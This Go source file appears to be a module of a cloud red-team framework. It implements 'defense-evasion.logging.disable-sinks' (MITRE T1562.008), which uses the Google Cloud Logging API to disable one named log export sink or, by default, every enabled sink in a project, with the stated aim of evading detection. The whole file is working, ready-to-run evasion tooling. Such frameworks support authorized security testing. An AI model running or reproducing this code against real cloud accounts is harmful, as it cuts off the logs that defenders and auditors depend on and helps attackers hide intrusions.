package logging

import (
	"context"
	"fmt"

	loggingv2 "google.golang.org/api/logging/v2"

	"github.com/user/nimbus/internal/module"
	"github.com/user/nimbus/internal/output"
)

func init() {
	module.Register(&DisableSinks{})
}

// DisableSinks disables log export sinks to evade detection.
type DisableSinks struct{}

func (m *DisableSinks) Info() module.Info {
	return module.Info{
		Name:         "defense-evasion.logging.disable-sinks",
		Tactic:       module.TacticDefenseEvasion,
		Service:      "logging",
		Description:  "Disable log export sinks to prevent log forwarding for evasion",
		RequiresAuth: true,
		AttackID:     "T1562.008",
	}
}

func (m *DisableSinks) Run(ctx module.RunContext) error {
	sinkName := ctx.Flags["sink"]
	project := ""
	if len(ctx.Projects) > 0 {
		project = ctx.Projects[0]
	}

	if project == "" {
		output.Warn("Usage: run defense-evasion.logging.disable-sinks --sink <name> -p <project>")
		output.Info("Tip: run 'recon.logging.scan-sinks' first to discover sinks.")
		return nil
	}

	svc, err := loggingv2.NewService(context.Background(), ctx.Session.ClientOption())
	if err != nil {
		return fmt.Errorf("create logging client: %w", err)
	}

	if sinkName != "" {
		return m.disableSink(svc, project, sinkName, ctx)
	}

	// Disable all sinks if no specific sink specified.
	output.Warn("No specific sink specified, listing all sinks...")
	resp, err := svc.Projects.Sinks.List(fmt.Sprintf("projects/%s", project)).Do()
	if err != nil {
		return fmt.Errorf("list sinks: %w", err)
	}

	for _, sink := range resp.Sinks {
		if !sink.Disabled {
			if err := m.disableSink(svc, project, sink.Name, ctx); err != nil {
				output.Error("Disable %s: %v", sink.Name, err)
			}
		}
	}
	return nil
}

func (m *DisableSinks) disableSink(svc *loggingv2.Service, project, sinkName string, ctx module.RunContext) error {
	fullName := fmt.Sprintf("projects/%s/sinks/%s", project, sinkName)

	output.Warn("Disabling sink: %s", sinkName)

	sink, err := svc.Projects.Sinks.Get(fullName).Do()
	if err != nil {
		return fmt.Errorf("get sink: %w", err)
	}

	sink.Disabled = true
	_, err = svc.Projects.Sinks.Update(fullName, sink).Do()
	if err != nil {
		return fmt.Errorf("disable sink: %w", err)
	}

	output.Success("Sink %s disabled", sinkName)

	if ctx.Findings != nil {
		ctx.Findings <- module.Finding{
			Module:      "defense-evasion.logging.disable-sinks",
			Severity:    module.SevCritical,
			Title:       "Log sink disabled for evasion",
			Description: fmt.Sprintf("Disabled log sink %s in project %s", sinkName, project),
			Resource:    sinkName,
			Project:     project,
		}
	}

	return nil
}
